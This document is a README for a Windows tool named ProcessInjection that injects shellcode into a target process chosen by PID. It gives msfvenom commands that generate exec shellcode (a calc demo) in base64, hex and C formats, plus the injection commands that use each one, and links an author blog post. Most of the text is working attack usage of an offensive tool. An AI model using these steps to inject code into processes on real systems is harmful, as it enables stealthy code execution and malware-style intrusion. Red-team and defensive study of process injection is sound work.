# ProcessInjection

----

The program is designed to inject shellcode in a target process.

Currently the program accepts shellcode in 3 formats 
	
	1) base64
	2) hex
	3) C

### Command Line Usage

    Generating shellcode in base64 format and injecting it in the target process.
	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" | base64
	ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:base64

	Generating shellcode in hex format and injecting it in the target process.
	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f hex
	ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:hex

	Generating shellcode in c format and injecting it in the target process.
	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f c
	ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c

### Blog Post

[https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html](https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html)
